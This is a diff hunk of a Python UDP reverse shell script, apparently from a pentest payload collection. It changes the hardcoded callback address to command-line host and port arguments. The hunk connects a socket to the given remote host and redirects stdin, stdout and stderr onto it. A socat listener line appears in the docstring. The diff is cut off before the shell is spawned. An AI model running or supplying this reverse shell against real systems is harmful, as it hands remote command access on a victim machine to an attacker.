@@ -14,14 +14,18 @@ socat file:`tty`,echo=0,raw  udp-listen:PORT
 """
 import os
 import pty
+import sys
 import socket
 
-lhost = "127.0.0.1" # XXX: CHANGEME
-lport = 31337 # XXX: CHANGEME
-
 def main():
+    if len(sys.argv) < 3:
+      print("Usage:\n  " + sys.argv[0] + " <ip> <port>\n")
+      exit(1)
+
+    rhost = str(sys.argv[1])
+    rport = int(sys.argv[2])
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.connect((lhost, lport))
+    s.connect((rhost, rport))
     os.dup2(s.fileno(),0)
     os.dup2(s.fileno(),1)
     os.dup2(s.fileno(),2)
